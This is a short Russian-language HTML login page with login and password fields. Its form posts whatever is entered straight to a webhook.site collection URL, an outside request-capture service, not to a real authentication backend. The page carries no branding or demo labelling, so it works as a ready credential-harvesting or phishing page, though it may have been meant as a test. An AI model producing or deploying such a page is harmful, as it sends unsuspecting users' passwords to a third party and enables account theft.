<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Авторизация</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="auth-container">
    <form action="https://webhook.site/e711c6e1-e677-4dcd-b3d0-d1aff55b38ea" method="post" class="auth-card">
      <h2>Вход</h2>
      
      <div class="input-group">
        <input type="text" id="login" name="login" required placeholder="Логин">
      </div>

      <div class="input-group">
        <input type="password" id="password" name="password" required placeholder="Пароль">
      </div>

      <div class="options-row">
        <label class="checkbox-label">
          <input type="checkbox" id="remember" name="remember">
          <span class="custom-check"></span>
          Запомнить меня
        </label>
      </div>

      <button type="submit" class="auth-btn">Войти</button>
    </form>
  </div>
</body>
</html>
